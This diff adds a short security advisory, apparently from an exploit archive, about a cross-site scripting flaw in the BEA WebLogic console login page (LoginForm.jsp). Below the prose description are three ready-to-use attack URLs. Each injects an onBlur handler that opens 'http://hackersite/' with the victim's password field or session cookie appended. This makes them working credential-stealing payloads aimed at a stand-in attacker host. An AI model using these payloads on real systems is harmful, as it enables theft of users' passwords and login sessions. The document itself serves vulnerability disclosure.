@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13793/info
+
+BEA WebLogic Server And WebLogic Express are affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input to the 'LoginForm.jsp' script.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+This issue was originally released as part of BID 13717 (BEA WebLogic Server and WebLogic Express Multiple Remote Vulnerabilities). Due to the availability of more information, this vulnerability is being assigned a new BID. 
+
+http://www.example.com:7001/console/login/LoginForm.jsp?j_password=""onBlur="window.open('http://hackersite/'%2Bdocument.all.j_password.value)"
+
+http://www.example.com:7001/console/login/LoginForm.jsp?j_username=""onBlur="window.open('http://hackersite/'%2Bdocument.cookie)"
+
+http://www.example.com:7001/console/login/LoginForm.jsp?j_password=""onBlur="window.open('http://hackersite/'%2Bdocument.cookie)" 
